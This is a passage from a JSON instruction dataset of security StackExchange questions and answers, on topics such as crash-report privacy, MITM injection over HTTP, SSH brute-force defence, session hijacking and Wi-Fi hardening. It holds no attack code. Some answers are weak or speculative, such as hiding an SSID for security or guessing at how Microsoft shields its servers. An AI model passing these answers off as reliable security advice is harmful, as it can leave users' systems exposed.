      "answer": "It is very unlikely that you gave away compromising information. Your active logins, cookies, search history and the content of your visited websites are safe. Presumably, the most relevant sensitive information in your case is the last visited URL (which you had to explicitly agree to submit).\nAlso note that Firefox doesn't submit crash reports without your consent. In the Mozilla docs you can find details on how the Mozilla Crash Reporter works and how you can understand crash reports.\nWhat does a crash report contain?\nA Firefox crash report contains information relevant for debugging such as:\n\nBrowser version\nInstalled extensions\nOperating system version and  configuration\nStack trace of the crash (involved modules, functions, etc.)\n\nYou can optionally include the URL of where the crash has occurred and a contact email address.\nWhere can I view my previous crash reports?\nYou can view your crashes from inside Firefox at about:crashes or locally at ~/.mozilla/firefox/Crash Reports/. All submitted Firefox crash reports are published on crash-stats.\nWho else can view a crash report?\nEveryone is able to view a basic version of your report but only few users can see sensitive details.\n\nSome fields, such as \"URL\" and \"Email Address\", are privacy-sensitive and are only visible to users with minidump access.\n\n(Source)\nSo even if you submitted the URL - it's not public, developers will probably never read it given the total amount of crash reports, and nobody will know it was you."
    }
  },
  {
    "instruction": "Answer the following question:\n\nCan my computer run malicious Javascript due to Man-in-the-middle attack on the connection with HTTP site?\nThere is an example for illustration purposes:\nLet's suppose that there is educational site about Celtic mythology. It's purely read-only site, not even comments are allowed. It's also very simple, it has no executable parts like Javascript/Flash/Java/Silverlight/Unity/ActiveX. There are no ads because the site lives on donations. In short, this is just collection of completely harmless HTML documents.\nBut this site uses HTTP instead of HTTPS. Does it mean that theoretically some malicious agent (like hacker, malware from other machine or ISP) could become \"man-in-the-middle\" and inject malicious Javascript (for example) into transfered page, despite that the original page had no Javascripts at all?",
    "context": "",
    "output": "A man in the middle can answer the plain HTTP requests sent by the client on behalf of the server. This includes modifying the original response of the server to  include Javascript which gets executed in the context of the page. Or the attacker might serve some malware to the visitor. It does not matter at all in these cases that the original site had only static HTML, all what matters is what the attacker serves. In fact, the attacker might serve completely different content without even contacting the original site.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can my computer run malicious Javascript due to Man-in-the-middle attack on the connection with HTTP site?\nThere is an example for illustration purposes:\nLet's suppose that there is educational site about Celtic mythology. It's purely read-only site, not even comments are allowed. It's also very simple, it has no executable parts like Javascript/Flash/Java/Silverlight/Unity/ActiveX. There are no ads because the site lives on donations. In short, this is just collection of completely harmless HTML documents.\nBut this site uses HTTP instead of HTTPS. Does it mean that theoretically some malicious agent (like hacker, malware from other machine or ISP) could become \"man-in-the-middle\" and inject malicious Javascript (for example) into transfered page, despite that the original page had no Javascripts at all?",
      "answer": "A man in the middle can answer the plain HTTP requests sent by the client on behalf of the server. This includes modifying the original response of the server to  include Javascript which gets executed in the context of the page. Or the attacker might serve some malware to the visitor. It does not matter at all in these cases that the original site had only static HTML, all what matters is what the attacker serves. In fact, the attacker might serve completely different content without even contacting the original site."
    }
  },
  {
    "instruction": "Please answer this question: aes-128 refers to the block size, key or both\nWhat does the number used in cipher suites next to the symmetric encryption algorithm reefers to?  Does it mean each block is divided into 128 bit blocks, the key size or both ?",
    "context": "",
    "output": "From Wikipedia AES:\n\nAES is a variant of Rijndael which has a fixed block size of 128 bits, and a key size of 128, 192, or 256 bits.\n\nThus, the number in AES-128, AES-192 and AES-256 refers to the key size only.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "aes-128 refers to the block size, key or both\nWhat does the number used in cipher suites next to the symmetric encryption algorithm reefers to?  Does it mean each block is divided into 128 bit blocks, the key size or both ?",
      "answer": "From Wikipedia AES:\n\nAES is a variant of Rijndael which has a fixed block size of 128 bits, and a key size of 128, 192, or 256 bits.\n\nThus, the number in AES-128, AES-192 and AES-256 refers to the key size only."
    }
  },
  {
    "instruction": "What is the answer to this question - secure webmail provider\nWhich email providers (e.g. Gmail, Yahoo, etc) offer the most robust security for a personal email account?  The recent article about Mat Honan getting hacked illustrates the challenge.  The account owner is responsible for some aspects (e.g. choose a strong password, partition your information by avoiding daisy-chaining), but the service provider also has responsibilities (e.g. verify identity of people calling support, provide robust authentication).\nGMail offers two-factor authentication, and Yahoo has the same feature in beta (as of August 2012).  Are there other aspects to consider?\nUPDATE: I accepted the answer below.  The discussion has reminded me to consider the people and process involved, not just the technology.\n\n",
    "context": "",
    "output": "For email security you can consider the following. These are common issues which are not well secured because of other factors, so the basics like XSS, virus scanning etc are not considered.\n\nStrict SSL-only access with no known attacks like BEAST\nLog of previous logon attempts\nEncrypted storage\nS/MIME, PGP support\nTLS on SMTP and IMAP\nHigh security application, which is not the case for most Webmail providers\n\nSo all of that is OK with GMAIL, Hotmail had issues with cookie handling recently (so it was enough to submit simple empty cookie for a session).\nThe most secure is to have email server on your own location, and protected the way, that without logging in with mailbox login / password, you cant read mail, and then simply run auto-update on the server, to make sure that the mailbox storage is not breached. Basically webmail with updates and good hardening does the effective trick good even for 100.000 mailboxes for business use.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "secure webmail provider\nWhich email providers (e.g. Gmail, Yahoo, etc) offer the most robust security for a personal email account?  The recent article about Mat Honan getting hacked illustrates the challenge.  The account owner is responsible for some aspects (e.g. choose a strong password, partition your information by avoiding daisy-chaining), but the service provider also has responsibilities (e.g. verify identity of people calling support, provide robust authentication).\nGMail offers two-factor authentication, and Yahoo has the same feature in beta (as of August 2012).  Are there other aspects to consider?\nUPDATE: I accepted the answer below.  The discussion has reminded me to consider the people and process involved, not just the technology.",
      "answer": "For email security you can consider the following. These are common issues which are not well secured because of other factors, so the basics like XSS, virus scanning etc are not considered.\n\nStrict SSL-only access with no known attacks like BEAST\nLog of previous logon attempts\nEncrypted storage\nS/MIME, PGP support\nTLS on SMTP and IMAP\nHigh security application, which is not the case for most Webmail providers\n\nSo all of that is OK with GMAIL, Hotmail had issues with cookie handling recently (so it was enough to submit simple empty cookie for a session).\nThe most secure is to have email server on your own location, and protected the way, that without logging in with mailbox login / password, you cant read mail, and then simply run auto-update on the server, to make sure that the mailbox storage is not breached. Basically webmail with updates and good hardening does the effective trick good even for 100.000 mailboxes for business use."
    }
  },
  {
    "instruction": "Answer the question below.\nIs there a security risk using a Symmetric-key for both encryption and HMACing\nI am proposing to use an AES key to encrypt some data to send to a third party and in a completely separate operation/flow use the same key to create a HMAC of a message to send to the same third party.\nI have been told that this is a risk to use the same key for two different things.  I cannot find any information on why this is a risk.  If this is a risk, what is it?\nI have found information on this site explaining why you should use different RSA keys pairs for encryption and signing and that makes sense, but nothing on symmetric keys.\nWhy should one not use the same asymmetric key for encryption as they do for signing?\nthanks",
    "context": "",
    "output": "The \"by the book\" approach to this is to use a key-stretching/key-derivation-function to turn a one secret into another (longer) secret. Or two or more secrets. One for HMAC, one AES session key, etc.\nThis is what TLS does. It expands the master secret into a block of six single other secrets.\nI can not name a practical attack if you don't do that.\nBut stretching the key is cheap. And afterwards you don't have to worry about related primitives attacks anymore. If nothing else, it's a method that allows you to mentally compartmentalize the different crypto parts. It makes the whole construction a lot easier to talk about.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there a security risk using a Symmetric-key for both encryption and HMACing\nI am proposing to use an AES key to encrypt some data to send to a third party and in a completely separate operation/flow use the same key to create a HMAC of a message to send to the same third party.\nI have been told that this is a risk to use the same key for two different things.  I cannot find any information on why this is a risk.  If this is a risk, what is it?\nI have found information on this site explaining why you should use different RSA keys pairs for encryption and signing and that makes sense, but nothing on symmetric keys.\nWhy should one not use the same asymmetric key for encryption as they do for signing?\nthanks",
      "answer": "The \"by the book\" approach to this is to use a key-stretching/key-derivation-function to turn a one secret into another (longer) secret. Or two or more secrets. One for HMAC, one AES session key, etc.\nThis is what TLS does. It expands the master secret into a block of six single other secrets.\nI can not name a practical attack if you don't do that.\nBut stretching the key is cheap. And afterwards you don't have to worry about related primitives attacks anymore. If nothing else, it's a method that allows you to mentally compartmentalize the different crypto parts. It makes the whole construction a lot easier to talk about."
    }
  },
  {
    "instruction": "Answer the question below.\nHow to alert webmaster if he does not put contact address\ni found a session cookie that contains user status with two parameters NO for standard users when altering this to YES you become a Premium user and you can download content restricted to premium users? the problem there is no contact address to send him a message?\nany idea ?",
    "context": "",
    "output": "If you're looking to get in touch with a website owner then there's a couple of possibilities.\n\nSome domains might map standard names (e.g. webmaster@[domain], contact@[domain], info@[domain])\nDNS records may well contain a contact name/address.  So running 'whois' will return that info.\nAlso IP address whois can return contact information.  So running 'dig [web server addresss]' and then running 'whois' on that IP address might provide more info.\n\nOne thing to watch is that some people don't like their security flaws being pointed out to them so you might want to use an e-mail account that doesn't directly tie back to you, in case they decide to get awkward..",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to alert webmaster if he does not put contact address\ni found a session cookie that contains user status with two parameters NO for standard users when altering this to YES you become a Premium user and you can download content restricted to premium users? the problem there is no contact address to send him a message?\nany idea ?",
      "answer": "If you're looking to get in touch with a website owner then there's a couple of possibilities.\n\nSome domains might map standard names (e.g. webmaster@[domain], contact@[domain], info@[domain])\nDNS records may well contain a contact name/address.  So running 'whois' will return that info.\nAlso IP address whois can return contact information.  So running 'dig [web server addresss]' and then running 'whois' on that IP address might provide more info.\n\nOne thing to watch is that some people don't like their security flaws being pointed out to them so you might want to use an e-mail account that doesn't directly tie back to you, in case they decide to get awkward.."
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhatsapp access to Google Drive\nI am very concerned today as I discovered whatsapp has access to my google drive.\nDoes this mean whatsapp can steal my google drive data with this access or is it restricted only to a specific folder?",
    "context": "",
    "output": "If you go to Google My Account Permissions and expand \"WhatsApp Messenger\":\n\nView and manage its own configuration data in your Google Drive\nView and manage Google Drive files and folders that you have opened or created with this app\n\nI am not an expert on Google Apps permissions, but the wording would indicate that it is limited to files WhatsApp wrote to Google Drive itself: \"opened or created with this app\".",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Whatsapp access to Google Drive\nI am very concerned today as I discovered whatsapp has access to my google drive.\nDoes this mean whatsapp can steal my google drive data with this access or is it restricted only to a specific folder?",
      "answer": "If you go to Google My Account Permissions and expand \"WhatsApp Messenger\":\n\nView and manage its own configuration data in your Google Drive\nView and manage Google Drive files and folders that you have opened or created with this app\n\nI am not an expert on Google Apps permissions, but the wording would indicate that it is limited to files WhatsApp wrote to Google Drive itself: \"opened or created with this app\"."
    }
  },
  {
    "instruction": "Please answer this question: response when sent emailed links to personal information\nI'm filling out tax information. The accountants out-source the survey collecting the tax info to another company. Seems fair enough - I'd rather have computer experts handle the technical implementation of my information's security than have tax accountants trying to do it.\nProblem is that when I pause work on inputting the info, the survey company emails me a link to return to the survey. No password involved at any stage. Anyone with the link can access the survey.\nObviously someone malicious could read the email. Or maybe I might use a browser that stores the URL. Or since the URL only has 5 random characters in it, it's probably possible to guess a random URL and get into someone's survey after enough tries.\nBut if I were to reach out to these companies, what should I say? Whenever I see something like this (plain text emails of passwords in particular), and complain, people just ignore it. So can anyone advise how to highlight the vulnerability in a way that gets people to take it seriously?",
    "context": "",
    "output": "Simply contacting both companies to register your concerns is a first step.\nSecondly, there are likely personal data protection laws/regulations that cover either company that you can reference and appeal to if you are not satisfied with the responses from the companies.\nYou can't force anyone to do anything to change how they process information. You can inform, encourage, and bring in regulators when applicable.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "response when sent emailed links to personal information\nI'm filling out tax information. The accountants out-source the survey collecting the tax info to another company. Seems fair enough - I'd rather have computer experts handle the technical implementation of my information's security than have tax accountants trying to do it.\nProblem is that when I pause work on inputting the info, the survey company emails me a link to return to the survey. No password involved at any stage. Anyone with the link can access the survey.\nObviously someone malicious could read the email. Or maybe I might use a browser that stores the URL. Or since the URL only has 5 random characters in it, it's probably possible to guess a random URL and get into someone's survey after enough tries.\nBut if I were to reach out to these companies, what should I say? Whenever I see something like this (plain text emails of passwords in particular), and complain, people just ignore it. So can anyone advise how to highlight the vulnerability in a way that gets people to take it seriously?",
      "answer": "Simply contacting both companies to register your concerns is a first step.\nSecondly, there are likely personal data protection laws/regulations that cover either company that you can reference and appeal to if you are not satisfied with the responses from the companies.\nYou can't force anyone to do anything to change how they process information. You can inform, encourage, and bring in regulators when applicable."
    }
  },
  {
    "instruction": "Answer this question:\n\nDefence for brute force attacks to ssh\nAt some point in the past I had a small (physical) webserver. From day 1 there were brute force attacks to ssh.\nI looked it up a bit and I set up iptables to block IPs that try to connect to ssh more than twice in a 2 minute period. This lead to distributed brute force attacks from whore ranges of IP addresses.\nEventually I solved my problem by allowing only an other computer that I had an account on to connect to my ssh. However the question remains. If login only with keys is for whatever reason inconvenient, how can one defend against brute force attacks to ssh?",
    "context": "",
    "output": "A: The best defenses I have found for the host machine are these:\n\nDisable Admin login\nDisable password login for users, RSA keys only, if you need more security look at ECDSA. \nDisable ICMP if you can (Considering you're a web server...)\nUFW and IPTable rules doing what you specified and make sure\nIPtables is logging the incidents.\nFail2ban - Install, configure, etc.\nDenyhosts - Install, configure, etc.\nInstall logwatch with verbose output to maintain a clean view\nof your logs at a moments notice.\n\nNetwork/router rules can allow white-listing which, if deployed properly, is very very effective.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Defence for brute force attacks to ssh\nAt some point in the past I had a small (physical) webserver. From day 1 there were brute force attacks to ssh.\nI looked it up a bit and I set up iptables to block IPs that try to connect to ssh more than twice in a 2 minute period. This lead to distributed brute force attacks from whore ranges of IP addresses.\nEventually I solved my problem by allowing only an other computer that I had an account on to connect to my ssh. However the question remains. If login only with keys is for whatever reason inconvenient, how can one defend against brute force attacks to ssh?",
      "answer": "The best defenses I have found for the host machine are these:\n\nDisable Admin login\nDisable password login for users, RSA keys only, if you need more security look at ECDSA. \nDisable ICMP if you can (Considering you're a web server...)\nUFW and IPTable rules doing what you specified and make sure\nIPtables is logging the incidents.\nFail2ban - Install, configure, etc.\nDenyhosts - Install, configure, etc.\nInstall logwatch with verbose output to maintain a clean view\nof your logs at a moments notice.\n\nNetwork/router rules can allow white-listing which, if deployed properly, is very very effective."
    }
  },
  {
    "instruction": "Answer the following question:\n\nDoes Google 2-step verification protect user from session hijacking?\nAfter signing in Google 2-Step verification scenario, user should enter verification code which sends to his mobile. Without it, he couldn't access to Gmail account.\nConsider an attacker does session hijacking. Can attacker access to Gmail account if attacker uses hijacked session? Or he will stop at entering verification code?\nUPDATE:\nAttacker does session hijacking after user enters verification code.",
    "context": "",
    "output": "Short answer: Yes, the attacker can use session hijacking.\nLong answer: attackers can use XSS to get your browser cookie (the one that Google sets) and inject it into their request for Google. Still, if that doesn't happen, malware can do whatever it wants while you are logged in.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does Google 2-step verification protect user from session hijacking?\nAfter signing in Google 2-Step verification scenario, user should enter verification code which sends to his mobile. Without it, he couldn't access to Gmail account.\nConsider an attacker does session hijacking. Can attacker access to Gmail account if attacker uses hijacked session? Or he will stop at entering verification code?\nUPDATE:\nAttacker does session hijacking after user enters verification code.",
      "answer": "Short answer: Yes, the attacker can use session hijacking.\nLong answer: attackers can use XSS to get your browser cookie (the one that Google sets) and inject it into their request for Google. Still, if that doesn't happen, malware can do whatever it wants while you are logged in."
    }
  },
  {
    "instruction": "What is the difference between \"unknown\" and \"undefined\" trust?\nWhen you trust a GnuPG key, you can choose one of these five options (and I'm assuming the same options exist in other OpenPGP tools):\n\n1 = I don't know or won't say (undefined)\n   2 = I do NOT trust (never)\n   3 = I trust marginally\n   4 = I trust fully\n   5 = I trust ultimately\n\nHowever, there is a \"sixth\" option that doesn't show up in the list: if you haven't yet set trust for a key, it shows up as unknown.\nIs there a reason GnuPG makes a distinction between the two? Is undefined trust treated differently than unknown, or is the distinction just for personal reference?",
    "context": "",
    "output": "The options 2 to 5 (never, marginally, fully and ultimately trusted) correspond to a definite decision made by you on the trust level which influences validity calculation.\nUnknown says, you haven't made any decision at all and thus is special, indicating no value at all (you might consider it some kind of NULL value). \nOption 1, undefined is similar and has similar outcome regarding validity caluclation, but is a statement you can issue on not wanting to decide on the key's trust level. You might want to use it as future reference instead of not setting any trust value.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the difference between \"unknown\" and \"undefined\" trust?\nWhen you trust a GnuPG key, you can choose one of these five options (and I'm assuming the same options exist in other OpenPGP tools):\n\n1 = I don't know or won't say (undefined)\n   2 = I do NOT trust (never)\n   3 = I trust marginally\n   4 = I trust fully\n   5 = I trust ultimately\n\nHowever, there is a \"sixth\" option that doesn't show up in the list: if you haven't yet set trust for a key, it shows up as unknown.\nIs there a reason GnuPG makes a distinction between the two? Is undefined trust treated differently than unknown, or is the distinction just for personal reference?",
      "answer": "The options 2 to 5 (never, marginally, fully and ultimately trusted) correspond to a definite decision made by you on the trust level which influences validity calculation.\nUnknown says, you haven't made any decision at all and thus is special, indicating no value at all (you might consider it some kind of NULL value). \nOption 1, undefined is similar and has similar outcome regarding validity caluclation, but is a statement you can issue on not wanting to decide on the key's trust level. You might want to use it as future reference instead of not setting any trust value."
    }
  },
  {
    "instruction": "Answer the question below.\nIs all traffic through a router configured to use openvpn protocol sent through a single port?\nA home wifi router is configured to use a vpn service, such as PIA, and in particular is configured to use the openvpn protocol. Is all traffic through this router sent through a single port? \nIs the following an accurate representation of the flow of traffic between a computer behind a vpn router and a website? (Also is that the correct usage of 'vpn router'?).  \nComputer sends data to router >> router encrypts data and sends it to vpn server >> vpn server decrypts data and sends it to its destination (e.g. a website)\n(reverse)\nwebsite sends data to vpn server >> vpn server encrypts data and sends it to router >> router decrypts data and sends it to computer \nThanks for any help in advance. I need this question answered so that I can ask my next question.",
    "context": "",
    "output": "Yes, it's exactly as you are thinking.\nA VPN connection works just like a proxy: every single connection is encapsulated in another one, connecting your router to the VPN server.\nFor an external observer, you will have only one very long-lived outgoing connection.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is all traffic through a router configured to use openvpn protocol sent through a single port?\nA home wifi router is configured to use a vpn service, such as PIA, and in particular is configured to use the openvpn protocol. Is all traffic through this router sent through a single port? \nIs the following an accurate representation of the flow of traffic between a computer behind a vpn router and a website? (Also is that the correct usage of 'vpn router'?).  \nComputer sends data to router >> router encrypts data and sends it to vpn server >> vpn server decrypts data and sends it to its destination (e.g. a website)\n(reverse)\nwebsite sends data to vpn server >> vpn server encrypts data and sends it to router >> router decrypts data and sends it to computer \nThanks for any help in advance. I need this question answered so that I can ask my next question.",
      "answer": "Yes, it's exactly as you are thinking.\nA VPN connection works just like a proxy: every single connection is encapsulated in another one, connecting your router to the VPN server.\nFor an external observer, you will have only one very long-lived outgoing connection."
    }
  },
  {
    "instruction": "Q: Combining Boxcryptor and encrypted cloud service\nI want to store highly critical documents on a cloud storage as an additional backup. I am using boxcryptor which encrypts files before these get synced to cloud. Boxcryptor encrypts files using AES-256 cipher.\nI am using a cloud storage service which encrypts the data at the client before storing on the cloud. So data remains encrypted at rest also. This service also uses AES-256.\nDoes dual encryption weakens the security?\n== Edited ==\nKeys are different.",
    "context": "",
    "output": " A: Dual encryption increases security, makes usage less practical and introduces problems when you want to recover your files. \nSo if you have to use dual encryption (because cloud service encrypts again no matter what) it's fine. But if you have freedom to choose, it's more practical and less troublesome to use a more complex key instead of encrypting two times.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Combining Boxcryptor and encrypted cloud service\nI want to store highly critical documents on a cloud storage as an additional backup. I am using boxcryptor which encrypts files before these get synced to cloud. Boxcryptor encrypts files using AES-256 cipher.\nI am using a cloud storage service which encrypts the data at the client before storing on the cloud. So data remains encrypted at rest also. This service also uses AES-256.\nDoes dual encryption weakens the security?\n== Edited ==\nKeys are different.",
      "answer": "Dual encryption increases security, makes usage less practical and introduces problems when you want to recover your files. \nSo if you have to use dual encryption (because cloud service encrypts again no matter what) it's fine. But if you have freedom to choose, it's more practical and less troublesome to use a more complex key instead of encrypting two times."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Given a heap address, can gdb show which function allocated the heap at this address?\nIn windbg, we can use \"!heap -p -a [address]\" to show the stacktrace when the heap was allocated.\nIn gdb, especially for kernel debugging, there is any way to achieve the same thing in linux?",
    "context": "",
    "output": "answer: AFAIK Windbg relies on the user-mode stack trace database provided by the kernel/ntdll. I think there is nothing similar built-in into Linux, but you can try some third-party tools, e.g. heaptrack",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Given a heap address, can gdb show which function allocated the heap at this address?\nIn windbg, we can use \"!heap -p -a [address]\" to show the stacktrace when the heap was allocated.\nIn gdb, especially for kernel debugging, there is any way to achieve the same thing in linux?",
      "answer": "AFAIK Windbg relies on the user-mode stack trace database provided by the kernel/ntdll. I think there is nothing similar built-in into Linux, but you can try some third-party tools, e.g. heaptrack"
    }
  },
  {
    "instruction": "Question: Why is it not possible to override password hashes\nI know that a password is stored as a hash, because then it is not possible to get the password even if you have access to the password database/file/...\nBut if you have access, couldn't you just replace the password hash with some hash where you know the related password, for example, if you know that 1234 has the hash '...'?",
    "context": "",
    "output": "Answer: If you have write access to the hash database, you can indeed write a new hash. If you wanted to recycle another hash, you'd need to replicate the scheme and the cryptographic salt (whose primary purpose is preventing hash recycling).\nOf course, if you have all of that, you could just generate the hash of whatever new password you want.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why is it not possible to override password hashes\nI know that a password is stored as a hash, because then it is not possible to get the password even if you have access to the password database/file/...\nBut if you have access, couldn't you just replace the password hash with some hash where you know the related password, for example, if you know that 1234 has the hash '...'?",
      "answer": "If you have write access to the hash database, you can indeed write a new hash. If you wanted to recycle another hash, you'd need to replicate the scheme and the cryptographic salt (whose primary purpose is preventing hash recycling).\nOf course, if you have all of that, you could just generate the hash of whatever new password you want."
    }
  },
  {
    "instruction": "What is the answer to this question - What are good Windows anti-debug references?\nWhat are good anti-debug references for Windows which help with manual unpacking, emulating, or sandboxing?\n\n",
    "context": "",
    "output": "Peter Ferrie's \u201cUltimate\u201d Anti-Debugging Reference (PDF, 147 pages) contains many anti-debugs, whether they're hardware or API based...\nWalied Assar's blog shows his researches, which are focused on finding new anti-debugs.\n\nother (maybe redundant) resources:\n\nNicolas Falli\u00e8re's Windows Anti-Debug reference\nOpenRCE's Anti Reverse Engineering Techniques Database\nDaniel Plohmann's AntiRE\nRodrigo Branco's Scientific but Not Academical Overview of Malware Anti-Debugging, Anti-Disassembly and Anti-\nVM Technologies\nMark Vincent Yason's Art Of Unpacking",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are good Windows anti-debug references?\nWhat are good anti-debug references for Windows which help with manual unpacking, emulating, or sandboxing?",
      "answer": "Peter Ferrie's \u201cUltimate\u201d Anti-Debugging Reference (PDF, 147 pages) contains many anti-debugs, whether they're hardware or API based...\nWalied Assar's blog shows his researches, which are focused on finding new anti-debugs.\n\nother (maybe redundant) resources:\n\nNicolas Falli\u00e8re's Windows Anti-Debug reference\nOpenRCE's Anti Reverse Engineering Techniques Database\nDaniel Plohmann's AntiRE\nRodrigo Branco's Scientific but Not Academical Overview of Malware Anti-Debugging, Anti-Disassembly and Anti-\nVM Technologies\nMark Vincent Yason's Art Of Unpacking"
    }
  },
  {
    "instruction": "Q: Never heard of compiler vulnerabilities when compiling?\nDoes there exist any real source code that exploits a compiler vulnerability? I mean code that during compilation causes a buffer overflow in the compiler resulting in execution of arbitrary code. \nWhen someone tries to compile that source code using a particular compiler version the compilation results in some exploit that infects the target machine.\nI'm not searching for toy examples or just research papers, but actually for something documented that affected at least some machine with a real payload.\nI know theoretically that this is possible, but I'm curious if this has ever been a real issue for someone.",
    "context": "",
    "output": " A: Yes, take a look at the change log of gcc, llvm, etc, although practical examples are rare. IIRC I have seen at least two practical PoC's; one was for java and the other a C compiler. If you extend the concept of a compilation to include JIT you can find many more examples in JavaScript, Ruby or the PHP engine to mention some. \nThere is also an issue of compilers introducing vulnerabilities into the compiled binary that may not exist in the source code through optimization. The first example that comes to mind is this Linux kernel exploit from a few years back where compiler optimization removed a check that would have prevented the vulnerability in the first place.\nCERT cover some various examples of code that may get optimized into being insecure over here.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Never heard of compiler vulnerabilities when compiling?\nDoes there exist any real source code that exploits a compiler vulnerability? I mean code that during compilation causes a buffer overflow in the compiler resulting in execution of arbitrary code. \nWhen someone tries to compile that source code using a particular compiler version the compilation results in some exploit that infects the target machine.\nI'm not searching for toy examples or just research papers, but actually for something documented that affected at least some machine with a real payload.\nI know theoretically that this is possible, but I'm curious if this has ever been a real issue for someone.",
      "answer": "Yes, take a look at the change log of gcc, llvm, etc, although practical examples are rare. IIRC I have seen at least two practical PoC's; one was for java and the other a C compiler. If you extend the concept of a compilation to include JIT you can find many more examples in JavaScript, Ruby or the PHP engine to mention some. \nThere is also an issue of compilers introducing vulnerabilities into the compiled binary that may not exist in the source code through optimization. The first example that comes to mind is this Linux kernel exploit from a few years back where compiler optimization removed a check that would have prevented the vulnerability in the first place.\nCERT cover some various examples of code that may get optimized into being insecure over here."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Is MAC address filtering effective on a wifi router?\nI want to improve the security of my home wifi. \nMy neighbor wants to crack my Wi-Fi password with a nutcracker. \nI tried to activate the protection by MAC address, but now my laptop and smartphone don't have access to the box. Is MAC address filtering effective?\nHow else can I secure my Wi-Fi?",
    "context": "",
    "output": "answer: If your neighbor is trying to crack your wifi you should change your password to a 15 character or more password containing letters, numbers, symbols, uppercase letters, lower case etc so its going to make it alot harder to crack the password to your wifi. If anything disable your network or make your network hidden.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is MAC address filtering effective on a wifi router?\nI want to improve the security of my home wifi. \nMy neighbor wants to crack my Wi-Fi password with a nutcracker. \nI tried to activate the protection by MAC address, but now my laptop and smartphone don't have access to the box. Is MAC address filtering effective?\nHow else can I secure my Wi-Fi?",
      "answer": "If your neighbor is trying to crack your wifi you should change your password to a 15 character or more password containing letters, numbers, symbols, uppercase letters, lower case etc so its going to make it alot harder to crack the password to your wifi. If anything disable your network or make your network hidden."
    }
  },
  {
    "instruction": "Please answer this question: POP3S vs POP3 with STARTTLS\nCan you tell me if there are any differences between POP3S and POP3 with STARTTLS?\n\nWhat's the safest?\nAre there any known attacks?\nIf you could choose about them, which would you pick?",
    "context": "",
    "output": "The only difference is that with old-style SSL, it is implied that you will start SSL negotiation immediately upon connection. With STARTTLS, you go through the same process, but only after issuing/receiving a STARTTLS command. The protocols are designed to throw away any information discovered or negotiated before the connection was secured, and start over again from scratch.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "POP3S vs POP3 with STARTTLS\nCan you tell me if there are any differences between POP3S and POP3 with STARTTLS?\n\nWhat's the safest?\nAre there any known attacks?\nIf you could choose about them, which would you pick?",
      "answer": "The only difference is that with old-style SSL, it is implied that you will start SSL negotiation immediately upon connection. With STARTTLS, you go through the same process, but only after issuing/receiving a STARTTLS command. The protocols are designed to throw away any information discovered or negotiated before the connection was secured, and start over again from scratch."
    }
  },
  {
    "instruction": "What is the answer to this question - Known Windows vulnerabilities vs actual exploits on Microsoft's websites?\nAlthough some of Microsoft's servers are running on Linux, at least half is running Windows Server of some kind.\nI'm trying to understand how with so many unpatched and unresolved vulnerabilities in Windows Microsoft's websites remain operational and don't get defaced on a regular basis or even on any basis at all. Is Windows (server) really that secure so we need not even install any patches or is there a trick to it that Microsoft employs?\n\n",
    "context": "",
    "output": "I guess the servers runing win server are in separated network and you access them through linux servers. On these servers is performed filtration of requests so can not use some exploits or known security holes because your attempts even not reach your victim servers.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Known Windows vulnerabilities vs actual exploits on Microsoft's websites?\nAlthough some of Microsoft's servers are running on Linux, at least half is running Windows Server of some kind.\nI'm trying to understand how with so many unpatched and unresolved vulnerabilities in Windows Microsoft's websites remain operational and don't get defaced on a regular basis or even on any basis at all. Is Windows (server) really that secure so we need not even install any patches or is there a trick to it that Microsoft employs?",
      "answer": "I guess the servers runing win server are in separated network and you access them through linux servers. On these servers is performed filtration of requests so can not use some exploits or known security holes because your attempts even not reach your victim servers."
    }
  },
  {
    "instruction": "Can you tell me the answer to: What does Encryption at REST and HTTPS mean?\nWhat does it mean when apps claim they encrypt at REST and HTTPS? I find this a little difficult to understand how different they are from the rest of the encryption-based Apps.",
    "context": "",
    "output": "answer: HTTPS is one form of \"encryption in transit\", which means that data passing over the network to or from the application is encrypted. \"Encryption at rest\" means that the data the application stores on its local storage is encrypted, so that an attacker who can access the storage but not the application itself can\u2019t read the data.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What does Encryption at REST and HTTPS mean?\nWhat does it mean when apps claim they encrypt at REST and HTTPS? I find this a little difficult to understand how different they are from the rest of the encryption-based Apps.",
      "answer": "HTTPS is one form of \"encryption in transit\", which means that data passing over the network to or from the application is encrypted. \"Encryption at rest\" means that the data the application stores on its local storage is encrypted, so that an attacker who can access the storage but not the application itself can\u2019t read the data."
    }
  },
  {
